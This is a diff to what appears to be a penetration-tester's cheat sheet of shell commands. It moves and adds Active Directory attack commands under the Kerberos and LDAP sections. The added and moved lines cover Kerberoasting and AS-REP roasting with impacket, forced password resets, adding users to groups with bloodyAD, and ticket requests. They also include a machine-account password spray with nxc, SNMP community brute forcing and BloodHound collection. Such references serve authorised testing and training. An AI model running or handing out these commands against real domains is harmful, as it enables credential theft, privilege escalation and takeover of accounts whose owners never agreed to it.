@@ -315,6 +315,16 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
+impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
+impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
+impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all
+impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
+impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
+impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
+while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
+
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
+
 sudo apt install -y heimdal-clients libsasl2-modules-gssapi-heimdal
 
 KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5_FILE"
@@ -336,21 +346,7 @@ KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5
 
 TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
-impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
-
-bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
-
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
-
-impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
-impacket-GetADUsers -dc-ip $TARGET $DOM/ -k -no-pass -all
-impacket-GetADComputers -dc-ip $TARGET $DOM/ -k -no-pass
-impacket-GetNPUsers -dc-ip $TARGET $DOM/ -usersfile usernames -k -no-pass
-impacket-GetUserSPNs -dc-ip $TARGET $DOM/ -usersfile usernames -k -no-pass
-
-nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
-
-while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (161) SNMP
 (onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
@@ -368,6 +364,7 @@ snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
 (nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET' &)
+nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
